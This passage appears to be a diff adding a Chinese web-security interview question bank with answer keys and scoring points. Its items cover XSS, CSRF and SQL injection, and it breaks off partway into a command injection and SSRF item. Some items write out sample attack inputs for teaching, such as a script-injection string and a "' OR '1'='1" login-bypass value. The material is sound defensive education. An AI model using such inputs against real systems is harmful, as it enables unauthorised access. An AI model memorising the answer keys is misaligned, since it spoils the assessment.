@@ -1,0 +1,463 @@
+[
+  {
+    "id": "Q-cs-seceq-web-0001",
+    "nodeId": "cs.seceq.web.xss",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "面试开场先确认基础：关于 XSS（跨站脚本）攻击的本质，下列理解**最准确**的是：",
+    "options": [
+      { "key": "A", "text": "攻击者把恶意脚本注入到网页中，受害者浏览器把它当作来自该站点的合法脚本执行，从而在同源上下文里窃取 Cookie、篡改页面或冒名操作" },
+      { "key": "B", "text": "攻击者伪造一个跨站请求，利用浏览器自动携带的 Cookie 让服务器误以为是受害者主动发起的操作" },
+      { "key": "C", "text": "攻击者在 SQL 语句里拼接特殊字符，改变查询结构从而绕过认证或拖走数据库" },
+      { "key": "D", "text": "攻击者发送超大报文把服务器内存占满，导致正常用户无法访问" }
+    ],
+    "answer": { "keys": ["A"] },
+    "analysis": "A 准确刻画了 XSS 的本质：注入的脚本进入受害者浏览器后，运行在目标站点的同源上下文中，因此能访问该源下的 DOM、Cookie（非 HttpOnly 部分）与本地存储。B 描述的是 CSRF（跨站请求伪造），核心是『借浏览器之手发请求』而非执行脚本，二者原理不同。C 是 SQL 注入，发生在服务端数据访问层。D 属于拒绝服务（DoS）范畴，与脚本注入无关。区分这几类攻击是安全题的起点。",
+    "gapCheck": [
+      "易漏点：XSS 之所以危害大，是因为脚本享有与页面自身脚本相同的同源权限，而不是单纯『页面上显示了奇怪内容』",
+      "常见误区：把 XSS 和 CSRF 混为一谈——XSS 是脚本注入执行，CSRF 是伪造请求，防御手段也完全不同",
+      "加分项：能指出存储型、反射型、DOM 型三类在『恶意脚本从哪里来、是否经过服务端』上的区别"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.xss"],
+      "related": ["cs.seceq.web.csrf", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "同源策略到底限制了什么？为什么注入的脚本能绕过它？",
+        "存储型、反射型、DOM 型 XSS 的触发链路分别是什么？"
+      ]
+    },
+    "openBookAllowed": false,
+    "source": { "kind": "self-authored", "note": "XSS 本质概念基础单选题" },
+    "tags": ["XSS", "同源策略", "Web 安全", "基础概念"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0002",
+    "nodeId": "cs.seceq.web.xss",
+    "type": "multiple",
+    "difficulty": 2,
+    "stem": "一个存在存储型 XSS 的评论区，攻击者写入了恶意脚本。下列属于 XSS 真实危害或合理防御手段的有：",
+    "options": [
+      { "key": "A", "text": "窃取未设置 HttpOnly 的会话 Cookie，进而劫持受害者登录态" },
+      { "key": "B", "text": "在页面里插入钓鱼表单或篡改 DOM，诱导用户输入账号密码" },
+      { "key": "C", "text": "对所有输出到 HTML 的用户数据做上下文相关的转义编码，并以 CSP 限制可执行脚本来源" },
+      { "key": "D", "text": "只要在入库时用正则过滤掉 <script> 标签，就可以彻底杜绝 XSS，输出时无需再处理" }
+    ],
+    "answer": { "keys": ["A", "B", "C"] },
+    "analysis": "A、B、C 正确。A 是 XSS 最经典的危害，脚本在同源上下文读取 document.cookie（HttpOnly 的读不到）；B 是 DOM 篡改/钓鱼，攻击者甚至不需要偷 Cookie 就能直接骗敏感信息；C 是标准纵深防御——输出编码按 HTML 正文、属性、JS、URL 等不同上下文选择转义规则，CSP 通过 script-src 等指令从浏览器侧限制脚本来源，即使漏编码也能挡住大部分利用。D 错误：黑名单过滤 <script> 极不可靠，事件属性（onerror、onclick）、javascript: 伪协议、各种编码变形都能绕过；正确做法是输出时按上下文编码，输入校验只能作为辅助而非唯一防线。",
+    "gapCheck": [
+      "易漏点：输出编码必须区分上下文，HTML 正文转义 < > & 和放在属性、JS 字符串里的转义规则并不相同",
+      "常见误区：以为过滤 <script> 标签就万事大吉，忽略事件属性、伪协议与编码绕过",
+      "加分项：能讲 CSP 的 nonce/hash 如何在保留必要内联脚本的同时阻止注入脚本执行"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.xss"],
+      "related": ["cs.seceq.auth.session-token", "cs.seceq.sec-eng.ratelimit-waf"],
+      "followUps": [
+        "CSP 的 default-src、script-src、nonce 分别怎么配合使用？",
+        "为什么 HttpOnly 不能完全消除 XSS 危害？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "XSS 危害与防御多选题" },
+    "tags": ["XSS", "CSP", "输出编码", "HttpOnly"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0003",
+    "nodeId": "cs.seceq.web.xss",
+    "type": "judge",
+    "difficulty": 2,
+    "stem": "判断正误：给会话 Cookie 设置 HttpOnly 后，JavaScript 通过 document.cookie 就读不到该 Cookie，因此能缓解 XSS 窃取会话；但它并不能阻止 XSS 本身发生，攻击者仍可在页面内以受害者身份发请求、篡改页面或读取页面上的敏感数据。",
+    "answer": { "judge": true },
+    "analysis": "正确。HttpOnly 是 Cookie 属性，作用仅是禁止客户端脚本通过 document.cookie 访问该 Cookie，从而抬高 XSS 偷取会话的门槛，它不影响浏览器在请求中自动携带 Cookie。它不是 XSS 的根治手段：脚本依然在同源上下文中执行，可以代替用户发起带 Cookie 的请求（CSRF 式操作）、操作 DOM、读取页面渲染出的 CSRF Token 或敏感信息、发起挖矿/挂马等。根治 XSS 仍要靠输出编码与 CSP。同理 Secure（仅 HTTPS 传输）、SameSite（跨站发送限制）也各有边界，不能混为一谈。",
+    "gapCheck": [
+      "易漏点：HttpOnly 只挡『脚本读 Cookie』这一条路径，不挡脚本执行，也不挡浏览器自动带 Cookie",
+      "常见误区：以为设了 HttpOnly 就不用做输出编码——属性级缓解和漏洞根因是两回事",
+      "加分项：能结合 SameSite、Secure 讲清三个 Cookie 属性分别解决的问题与组合使用方式"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.xss"],
+      "related": ["cs.seceq.auth.session-token", "cs.seceq.web.csrf"],
+      "followUps": [
+        "Secure 和 SameSite 属性各自防住什么、防不住什么？",
+        "XSS 拿到页面后如何绕过 CSRF Token 防御？"
+      ]
+    },
+    "openBookAllowed": false,
+    "source": { "kind": "self-authored", "note": "HttpOnly 作用边界判断题" },
+    "tags": ["HttpOnly", "XSS", "Cookie 安全", "判断"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0004",
+    "nodeId": "cs.seceq.web.xss",
+    "type": "short",
+    "difficulty": 3,
+    "stem": "请分别说明存储型、反射型、DOM 型 XSS 的触发链路（恶意脚本从哪里来、是否经过服务端），并给出一套成体系的 XSS 防御方案，解释为什么『只做输入过滤』不够。",
+    "answer": {
+      "ref": "参考骨架：\n【三类触发链路】①存储型：攻击者把恶意脚本提交并持久化到服务端（评论、个人资料、私信等），后续任何访问该页面的用户，浏览器从服务端取回含脚本的内容并执行，危害面最广、一次注入多次触发。②反射型：恶意脚本出现在 URL 参数里，受害者点击特制链接后，服务端把参数原样『反射』回响应页面（如搜索关键词回显、错误提示），脚本随即执行，需要诱导点击、不持久化。③DOM 型：注入与执行完全发生在前端，服务端返回的页面本身干净，但前端 JS 把不可信数据（location.hash、URL 参数、postMessage 等）不经处理写入 innerHTML/eval 等危险 sink，服务端甚至感知不到 payload，传统服务端过滤天然失效。\n【成体系防御】①输出编码是主战场：按数据落地的上下文（HTML 正文、HTML 属性、JS 字符串、CSS、URL 参数）采用对应转义规则，优先用成熟模板引擎/框架的默认转义，避免手写 innerHTML。②CSP 内容安全策略：用 default-src/script-src 限制脚本来源，配合 nonce 或 hash 放行必要内联脚本，禁止不可信外链与内联事件，形成浏览器侧第二道防线。③Cookie 安全属性：HttpOnly 降低会话被窃取风险，Secure 保证仅 HTTPS 传输，SameSite 限制跨站携带。④输入校验作为辅助：白名单校验格式与长度，拦截明显异常数据，但不承担主要防御职责。⑤避免危险 API：谨慎使用 eval、innerHTML、document.write、setTimeout(string) 等。\n【为何输入过滤不够】黑名单永远跟不上绕过手法（事件属性 onerror/onclick、javascript: 伪协议、大小写/HTML 实体/Unicode/Base64 编码变形、标签嵌套）；同一份数据可能进入不同上下文，需要的转义各不相同，入库时无法预知；DOM 型 XSS 的 payload 根本不经过服务端。因此原则是『不信任任何数据、在输出时按上下文编码』，输入过滤与 CSP 作为纵深补充。"
+    },
+    "scoringPoints": [
+      { "point": "三类 XSS 触发链路区分准确，尤其讲清 DOM 型不经过服务端的特点", "weight": 3 },
+      { "point": "防御成体系：上下文相关输出编码为主，CSP、Cookie 属性、输入校验分层配合", "weight": 3 },
+      { "point": "讲透输入黑名单可被绕过、上下文差异与 DOM 型逃逸服务端过滤三个原因", "weight": 3 },
+      { "point": "能举出危险 sink（innerHTML/eval 等）与框架默认转义的工程实践", "weight": 1 }
+    ],
+    "analysis": "XSS 章节的核心简答。常见失分：三类 XSS 只会背名字讲不清数据流；把防御简单归结为『过滤特殊字符』；不知道 DOM 型发生在前端、服务端 WAF 难以覆盖；CSP 只字不提。高分回答能沿着『不可信数据→危险 sink→同源执行』这条链，把编码、CSP、Cookie 属性、输入校验组织成纵深防御，并解释每层各自防什么。",
+    "gapCheck": [
+      "易漏点：反射型需要诱导点击、存储型持久化、DOM 型纯前端，三者的持久化与服务端参与度不同",
+      "常见误区：把 XSS 防御等同于输入过滤，忽略输出上下文才是转义规则的决定因素",
+      "加分项：能讲 CSP 违规上报（report-uri/report-to）用于发现真实注入尝试"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.xss"],
+      "related": ["cs.seceq.web.csrf", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "富文本场景（允许部分 HTML）下如何做安全过滤？",
+        "前端框架（Vue/React）默认转义在哪些写法下会失效？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "三类 XSS 链路与防御体系简答题" },
+    "tags": ["XSS", "存储型", "DOM 型", "CSP", "输出编码"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0005",
+    "nodeId": "cs.seceq.web.xss",
+    "type": "code",
+    "difficulty": 4,
+    "stem": "手写题：用 JavaScript 实现一个 HTML 转义函数 `escapeHtml(str)`，把 `& < > \" '` 五个字符转义为对应实体（&amp; &lt; &gt; &quot; &#39;），要求兼容 null/undefined 与非字符串输入；再写一组测试用例覆盖脚本注入、引号属性注入、& 符号、数字与空值，断言输出正确并打印通过情况。最后说明为什么转义顺序里 `&` 必须最先处理。",
+    "answer": {
+      "ref": "机理：HTML 正文与属性注入的根源是 < > 被当成标签、引号被当成属性边界、& 被当成实体起始符。把这五个字符替换成实体后，浏览器只会把它们渲染为文本而非解析为结构。& 必须最先替换：实体本身含有 & 和 ;，若先替换 < 等再处理 &，会把已生成实体里的 &（如 &lt; 中的 &）再次转义成 &amp;lt;，造成双重转义、页面显示乱码。单引号转 &#39; 是为了覆盖单引号包裹的属性场景。注意这是 HTML 上下文的转义，放进 JS 字符串或 URL 还需各自上下文的编码。",
+      "code": "function escapeHtml(str) {\n  if (str === null || str === undefined) return '';\n  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '\"': '&quot;', \"'\": '&#39;' };\n  return String(str).replace(/[&<>\"']/g, (ch) => map[ch]);\n}\n\nconst cases = [\n  ['<script>alert(1)</script>', '&lt;script&gt;alert(1)&lt;/script&gt;'],\n  ['a & b < c', 'a &amp; b &lt; c'],\n  ['\"quoted\"', '&quot;quoted&quot;'],\n  [\"it's a test\", 'it&#39;s a test'],\n  [123, '123'],\n  [null, ''],\n  ['普通中文 no change', '普通中文 no change']\n];\nlet pass = 0;\nfor (const [input, expected] of cases) {\n  const got = escapeHtml(input);\n  const ok = got === expected;\n  if (ok) pass++;\n  console.log(ok ? 'PASS' : 'FAIL', JSON.stringify(input), '->', got);\n}\nconsole.log(`通过 ${pass}/${cases.length}`);"
+    },
+    "scoringPoints": [
+      { "point": "五个字符实体映射正确，且 & 放在替换顺序首位避免双重转义", "weight": 3 },
+      { "point": "null/undefined 返回空串、非字符串经 String() 归一化处理", "weight": 2 },
+      { "point": "测试覆盖脚本注入、属性引号、&、数字、空值等边界且断言可运行", "weight": 3 },
+      { "point": "能说明 HTML 上下文转义与 JS/URL 上下文编码的区别", "weight": 2 }
+    ],
+    "analysis": "XSS 防御落地手写题。常见失分：漏掉单引号或 &；& 不在首位导致双重转义；用 indexOf/多次 replace 拼接且顺序混乱；不处理 null 直接抛错或输出字符串 'null'；只写函数不写测试。能进一步指出正则字符类里 - 的位置、框架自带转义优先于手写，属于工程加分。生产中应优先使用成熟库（如 lodash.escape、模板引擎默认转义）而非自造。",
+    "gapCheck": [
+      "易漏点：& 必须最先转义，否则生成的实体被二次转义；单引号常被遗漏",
+      "常见误区：以为一个转义函数通吃所有上下文——HTML、属性、JS、URL 的编码规则不同",
+      "加分项：能讲生产环境优先用框架/成熟库默认转义，并配合 CSP 做纵深防御"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.xss"],
+      "related": ["cs.seceq.web.csrf", "cs.seceq.sec-eng.ratelimit-waf"],
+      "followUps": [
+        "如果数据要插入 <a href> 的 URL 里，还需要额外做什么编码？",
+        "富文本必须保留部分标签时，白名单过滤库（如 js-xss）大致怎么工作？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "HTML 转义函数手写代码题" },
+    "tags": ["手写题", "XSS", "输出编码", "HTML 转义"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0006",
+    "nodeId": "cs.seceq.web.csrf",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "用户已登录某银行网站，随后点击了攻击者构造的恶意页面，页面里的表单自动向银行转账接口发起 POST。下列对该 CSRF 攻击成立原因的描述，**最准确**的是：",
+    "options": [
+      { "key": "A", "text": "浏览器向银行域名发请求时会自动带上该域下的会话 Cookie，服务器只凭 Cookie 认人，又没有校验请求是否为用户真实意愿，于是把伪造请求当作合法操作执行" },
+      { "key": "B", "text": "恶意页面通过 JavaScript 直接读到了银行网站的会话 Cookie，然后用它手动构造请求" },
+      { "key": "C", "text": "攻击者破解了用户的银行账号密码，在自己电脑上正常登录后转账" },
+      { "key": "D", "text": "银行服务器存在 SQL 注入，攻击者通过注入修改了账户余额" }
+    ],
+    "answer": { "keys": ["A"] },
+    "analysis": "A 准确：CSRF 的核心是浏览器的 Cookie 自动携带机制——跨站表单/图片等请求发往银行域时会带上银行的会话 Cookie，服务端若仅凭 Cookie 鉴权且缺少意图校验，就无法区分『用户主动发起』与『第三方页面诱导发起』。B 错误：同源策略阻止恶意页面的脚本读取银行域 Cookie，CSRF 攻击者通常看不到 Cookie，只是『借用』浏览器自动携带的能力，这正是它与 XSS 的关键区别。C 是凭据泄露而非 CSRF。D 是 SQL 注入，属另一类漏洞。",
+    "gapCheck": [
+      "易漏点：攻击者不需要知道 Cookie 内容，浏览器自动携带才是攻击成立的关键",
+      "常见误区：以为 CSRF 是脚本读到了 Cookie——读不到，跨站脚本受同源策略限制",
+      "加分项：能讲清攻击成立三前提：Cookie 鉴权、无二次校验、参数可被预测构造"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.csrf"],
+      "related": ["cs.seceq.web.xss", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "为什么 JSON 请求体 + 自定义头能在一定程度上缓解 CSRF？",
+        "SameSite=Lax 下哪些跨站请求仍会带 Cookie？"
+      ]
+    },
+    "openBookAllowed": false,
+    "source": { "kind": "self-authored", "note": "CSRF 成立原理基础单选题" },
+    "tags": ["CSRF", "Cookie", "同源策略", "基础概念"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0007",
+    "nodeId": "cs.seceq.web.csrf",
+    "type": "multiple",
+    "difficulty": 3,
+    "stem": "要防御 CSRF，下列措施中**确实有效且工程上常用**的有：",
+    "options": [
+      { "key": "A", "text": "同步令牌模式：服务端为每个会话生成随机 CSRF Token 放进表单/响应头，提交时校验，跨站攻击者无法从同源页面读到该 Token" },
+      { "key": "B", "text": "给会话 Cookie 设置 SameSite 属性（Lax 或 Strict），限制浏览器在跨站请求中携带该 Cookie" },
+      { "key": "C", "text": "对写操作校验 Origin/Referer 头，确认请求来自可信同源页面，并对关键操作要求二次确认或重新验证" },
+      { "key": "D", "text": "把所有接口改成 GET 请求，认为 GET 不会被跨站伪造，因此无需任何其他防护" }
+    ],
+    "answer": { "keys": ["A", "B", "C"] },
+    "analysis": "A、B、C 都是有效手段。A 是经典同步令牌（Synchronizer Token Pattern）：Token 存在服务端会话里、渲染到表单，攻击者受同源策略限制读不到页面中的 Token，伪造请求因缺/错 Token 被拒。B 从 Cookie 层面切断自动携带，现代浏览器默认 Lax，是性价比很高的一道防线。C 属于来源校验与业务确认，Referer/Origin 由浏览器控制（但历史上 Referer 可被策略置空，宜作辅助而非唯一手段），二次确认直接保证用户意图。D 错误且危险：GET 同样能被跨站触发（如 <img src>），而且用 GET 做写操作本身违反 HTTP 语义，绝不能替代专用防御。",
+    "gapCheck": [
+      "易漏点：CSRF Token 防御有效的根因是同源策略让攻击者读不到 Token，而不是 Token 本身保密",
+      "常见误区：以为 GET 天然安全——img/script 标签都能发起跨站 GET",
+      "加分项：能讲 SameSite 三值差异、双重提交 Cookie 模式以及 Token 与 SameSite 组合使用"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.csrf"],
+      "related": ["cs.seceq.web.xss", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "双重提交 Cookie 模式和同步令牌模式在服务端存储上有什么区别？",
+        "跨域前后端分离架构下 CSRF Token 一般怎么传递？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "CSRF 防御措施多选题" },
+    "tags": ["CSRF", "CSRF Token", "SameSite", "Origin"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0008",
+    "nodeId": "cs.seceq.web.csrf",
+    "type": "judge",
+    "difficulty": 3,
+    "stem": "判断正误：Cookie 的 SameSite 属性有 Strict、Lax、None 三个值；Strict 下任何跨站请求都不带 Cookie，Lax 允许跨站的顶级导航 GET 请求携带 Cookie（如从外部链接点进来），而 None 表示不限制但必须同时设置 Secure；现代浏览器对未显式声明 SameSite 的 Cookie 默认按 Lax 处理。",
+    "answer": { "judge": true },
+    "analysis": "正确。Strict 最严格，跨站请求一律不携带 Cookie，安全性最高但从外部链接点进网站会表现为未登录、体验受损；Lax 是安全与体验的折中，跨站顶级导航的安全 GET（点击链接、顶层窗口跳转）会带 Cookie，而跨站 POST、iframe、img 等不带，现代浏览器对未声明的 Cookie 默认即 Lax；None 允许跨站携带，常用于跨域/第三方场景，规范强制要求同时带 Secure（仅 HTTPS）。还要注意 SameSite 判定基于『站点（eTLD+1）』而非严格同源，且旧浏览器兼容性需配合 CSRF Token 等其他手段，不能只依赖它。",
+    "gapCheck": [
+      "易漏点：Lax 只放行顶级导航的安全 GET，跨站 POST 和子资源加载仍不带 Cookie",
+      "常见误区：把 SameSite 当成严格同源判断——它的粒度是站点（注册域名）而非 origin",
+      "加分项：能讲 SameSite=None 必须配 Secure，以及老浏览器下用 CSRF Token 兜底"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.csrf"],
+      "related": ["cs.seceq.auth.session-token", "cs.seceq.web.xss"],
+      "followUps": [
+        "为什么第三方嵌入场景（如 iframe 支付）必须用 SameSite=None; Secure？",
+        "SameSite 和 CSRF Token 同时部署时各自承担什么角色？"
+      ]
+    },
+    "openBookAllowed": false,
+    "source": { "kind": "self-authored", "note": "SameSite 三值行为判断题" },
+    "tags": ["SameSite", "Cookie", "CSRF", "判断"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0009",
+    "nodeId": "cs.seceq.web.csrf",
+    "type": "short",
+    "difficulty": 3,
+    "stem": "请从攻击原理、攻击者能否读取目标站点数据、防御手段三个维度对比 XSS 与 CSRF，并解释为什么说『存在 XSS 的站点，其 CSRF 防御基本可以被绕过』。",
+    "answer": {
+      "ref": "参考骨架：\n【原理对比】CSRF：攻击者诱导浏览器向目标站点发一个『伪造但合法』的请求，借浏览器自动携带 Cookie 的机制以受害者身份执行写操作，攻击者不能读取响应内容，本质是『冒充用户的意图』。XSS：攻击者把脚本注入目标站点页面，脚本在受害者浏览器的目标源上下文中执行，本质是『在可信源里运行了不可信代码』。\n【能否读数据】CSRF 受同源策略限制，攻击者的跨站页面读不到目标域的 Cookie、DOM 和响应，通常只能盲发请求（如转账、改邮箱）；XSS 注入的脚本本身就运行在目标同源内，可以读 DOM、读非 HttpOnly Cookie、发同源请求并读取响应、窃取页面里的 CSRF Token，能力远强于 CSRF。\n【防御手段】CSRF 靠 CSRF Token（同步令牌/双重提交）、SameSite Cookie、Origin/Referer 校验、关键操作二次确认；XSS 靠上下文相关输出编码、CSP、Cookie 安全属性、规避危险 sink。二者防御正交，需要分别建设。\n【为何 XSS 可绕过 CSRF 防御】CSRF Token 的安全前提是『攻击者无法从同源页面读取 Token』。一旦站点存在 XSS，攻击者脚本运行在同源上下文，可以直接从 DOM（隐藏表单字段、meta 标签）或 Cookie（双重提交模式）中读出 CSRF Token，再带着正确 Token 发起合法请求，服务端校验通过；同源策略此时对注入脚本不设防。SameSite 也挡不住——XSS 发起的是同源请求，Cookie 正常携带。因此 XSS 通常被视为危害等级更高的漏洞，安全建设上必须先确保没有 XSS，CSRF 防护才成立；这也解释了为什么敏感 Cookie 要加 HttpOnly（至少不让脚本直接拿走会话）。"
+    },
+    "scoringPoints": [
+      { "point": "原理对比准确：CSRF 是伪造请求、XSS 是注入并执行脚本", "weight": 3 },
+      { "point": "讲清两者在同源策略下读取数据能力的本质差异", "weight": 2 },
+      { "point": "防御手段分别列出且说明二者正交、需分别建设", "weight": 2 },
+      { "point": "讲透 XSS 能读取 CSRF Token 从而使令牌校验失效的绕过机理", "weight": 3 }
+    ],
+    "analysis": "高频对比题。常见失分：只分别背定义，讲不出『能不能读响应/Cookie』这个关键能力差；把两者防御混为一谈；解释绕过时机理含糊，说不到『XSS 脚本能读 DOM 里的 Token』这一根因。高分回答会点出同源策略是 CSRF Token 防线的隐含基石，而 XSS 恰好瓦解了这块基石。",
+    "gapCheck": [
+      "易漏点：CSRF 一般是盲打、读不到响应；XSS 脚本能读同源响应，危害维度不同",
+      "常见误区：认为部署了 CSRF Token 就不用管 XSS——XSS 可直接窃取 Token",
+      "加分项：能提 HttpOnly 只保护 Cookie 不被读、保护不了 DOM 中的 Token，CSP 可降低 XSS 成功率"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.csrf"],
+      "related": ["cs.seceq.web.xss", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "双重提交 Cookie 模式下，XSS 能同时读到表单和 Cookie 里的 Token 吗？",
+        "CSP 能不能在 XSS 已发生时限制其向外窃取数据？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "XSS 与 CSRF 对比简答题" },
+    "tags": ["XSS", "CSRF", "同源策略", "对比"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0010",
+    "nodeId": "cs.seceq.web.csrf",
+    "type": "code",
+    "difficulty": 4,
+    "stem": "手写题：用 Node.js 实现同步令牌模式的 CSRF Token 生成与校验：`generate(sessionId)` 用密码学安全随机数生成 Token 并与会话绑定存储；`validate(sessionId, token)` 做恒定时间比较，校验通过后立即作废该 Token（一次性、防重放），伪造、跨会话冒用、重放都要返回 false。写测试覆盖这几种攻击并打印结果。",
+    "answer": {
+      "ref": "机理：同步令牌模式要求服务端为每个会话保存随机、不可预测的 Token，表单页下发、提交时回传比对。随机数必须用 CSPRNG（crypto.randomBytes），不能用 Math.random；比较要用 timingSafeEqual 恒定时间比较，防止攻击者通过响应耗时差异逐字节猜 Token；Token 与 sessionId 绑定，A 会话的 Token 不能用于 B 会话；校验成功即删除实现一次性，拦截重放。生产中 Token 也可按会话长期有效配合随机化，关键是不可预测且攻击者同源外读不到。",
+      "code": "const crypto = require('node:crypto');\n\n// 同步令牌模式：token 与服务端 session 绑定，校验通过即作废（一次性）\nclass CsrfTokenStore {\n  constructor() {\n    this.sessionToken = new Map(); // sessionId -> token\n  }\n\n  generate(sessionId) {\n    const token = crypto.randomBytes(32).toString('hex');\n    this.sessionToken.set(sessionId, token);\n    return token;\n  }\n\n  // 恒定时间比较，避免计时侧信道\n  safeEqual(a, b) {\n    const ba = Buffer.from(a || '');\n    const bb = Buffer.from(b || '');\n    if (ba.length !== bb.length) return false;\n    return crypto.timingSafeEqual(ba, bb);\n  }\n\n  validate(sessionId, token) {\n    if (typeof token !== 'string' || token.length === 0) return false;\n    const expected = this.sessionToken.get(sessionId);\n    if (!expected || !this.safeEqual(token, expected)) return false;\n    this.sessionToken.delete(sessionId); // 一次性，防重放\n    return true;\n  }\n}\n\nconst store = new CsrfTokenStore();\nconst t1 = store.generate('sess-1');\nconsole.log('token 长度(hex):', t1.length); // 64\nconsole.log('伪造 token 校验:', store.validate('sess-1', 'a'.repeat(64))); // false\nconsole.log('正确 token 校验:', store.validate('sess-1', t1)); // true\nconsole.log('同一 token 重放:', store.validate('sess-1', t1)); // false\n\nconst t2 = store.generate('sess-1');\nconsole.log('拿 sess-1 的 token 冒充 sess-2:', store.validate('sess-2', t2)); // false\nconsole.log('sess-1 本人正确校验:', store.validate('sess-1', t2)); // true"
+    },
+    "scoringPoints": [
+      { "point": "用 crypto.randomBytes 等 CSPRNG 生成足够长（如 32 字节）的不可预测 Token", "weight": 3 },
+      { "point": "Token 与 sessionId 绑定存储，跨会话冒用被拒绝", "weight": 2 },
+      { "point": "timingSafeEqual 恒定时间比较，先判长度再比较，防计时侧信道", "weight": 2 },
+      { "point": "校验成功即作废实现一次性防重放，测试覆盖伪造/冒用/重放", "weight": 3 }
+    ],
+    "analysis": "CSRF 工程落地手写题。常见失分：用 Math.random 生成 Token（可预测）；用 === 直接比较（存在计时侧信道）；Token 不与会话绑定导致可串用；缺少一次性机制使 Token 泄露后可无限重放；忘记处理长度不一致直接调 timingSafeEqual 会抛异常。能讲清同步令牌与双重提交 Cookie 的区别、为何随机不可预测是核心，属于加分。",
+    "gapCheck": [
+      "易漏点：timingSafeEqual 要求等长 Buffer，长度不同要先返回 false，否则抛异常",
+      "常见误区：用 Math.random 生成安全 Token——它不是密码学安全随机数",
+      "加分项：能讲一次性 Token 与会话级 Token 的权衡、以及 SameSite 作为浏览器侧补充防线"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.csrf"],
+      "related": ["cs.seceq.crypto.random-secret", "cs.seceq.auth.session-token"],
+      "followUps": [
+        "双重提交 Cookie 模式为什么服务端可以不存 Token？安全性依赖什么？",
+        "SPA 前后端分离下，Token 通常通过什么响应头下发、什么请求头回传？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "CSRF Token 生成校验手写代码题" },
+    "tags": ["手写题", "CSRF Token", "CSPRNG", "恒定时间比较"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0011",
+    "nodeId": "cs.seceq.web.injection",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "登录接口用拼接方式构造 SQL：`SELECT * FROM users WHERE name='\" + name + \"' AND pwd='\" + pwd + \"'`。攻击者在用户名输入 `' OR '1'='1`。下列关于该 SQL 注入及根治手段的说法，**正确**的是：",
+    "options": [
+      { "key": "A", "text": "输入改变了 WHERE 条件结构使其恒真，可能绕过登录认证；根治手段是使用参数化查询（预编译 + 占位符），把代码结构与用户数据严格分离" },
+      { "key": "B", "text": "这只是输入了特殊字符，只要前端把单引号过滤掉就彻底安全，服务端无需改造" },
+      { "key": "C", "text": "参数化查询会把性能降低到无法接受，生产环境应该用字符串拼接再手动转义" },
+      { "key": "D", "text": "只要给数据库账号加上读写权限，注入就无法成功" }
+    ],
+    "answer": { "keys": ["A"] },
+    "analysis": "A 正确：拼接后条件变成 name='' OR '1'='1' 之类恒真表达式，WHERE 失效导致绕过认证甚至拖库。参数化查询（Prepared Statement + 占位符）让 SQL 语句结构先编译固定，用户输入只作为纯数据绑定，无法被解析为 SQL 语法，是根治手段。B 错误：前端过滤可被绕过（直接构造请求），且黑名单转义易遗漏，过滤应在服务端且只能辅助。C 错误：预编译通常还有执行计划复用的性能优势，现代驱动默认推荐，安全与性能并不冲突。D 错误：加大权限反而扩大注入危害；正确做法是最小权限账号（业务账号不给 DROP/FILE 等权限）以降低失陷后的影响面。",
+    "gapCheck": [
+      "易漏点：参数化防注入的本质是『结构与数据分离』，占位符内容永不被当 SQL 语法解析",
+      "常见误区：依赖前端或黑名单过滤——可被直接调接口绕过，且编码变形层出不穷",
+      "加分项：能讲 ORDER BY/表名等无法占位的位置要用白名单，以及最小权限账号缩小爆炸半径"
+    ],
+    "knowledgeLinks": {
+      "prereq": ["cs.seceq.web.injection"],
+      "related": ["cs.seceq.sec-eng.ratelimit-waf", "cs.seceq.sec-eng.owasp"],
+      "followUps": [
+        "like 模糊查询、in 列表、order by 这些场景参数化要怎么写？",
+        "ORM 框架是否就绝对防注入？哪些写法（原生 SQL 拼接）仍会踩坑？"
+      ]
+    },
+    "openBookAllowed": true,
+    "source": { "kind": "self-authored", "note": "SQL 注入与参数化单选题" },
+    "tags": ["SQL 注入", "参数化查询", "预编译", "最小权限"]
+  },
+  {
+    "id": "Q-cs-seceq-web-0012",
+    "nodeId": "cs.seceq.web.injection",
+    "type": "multiple",
+    "difficulty": 3,
+    "stem": "关于命令注入、SSRF、路径穿越三类服务端漏洞，下列说法**正确**的有：",
+    "options": [
+      { "key": "A", "text": "命令注入常因把用户输入拼进 shell 命令（如 ;、|、&&、反引号、$()），防御应使用参数数组方式调用、不经过 shell 解释，并对参数做白名单" },
+      { "key": "B", "text": "SSRF 诱使服务端去请求攻击者指定的 URL，可能打到内网服务或云元数据地址；防御要限制协议（只允许 http/https）、用白名单并禁止内网与元数据地址段" },
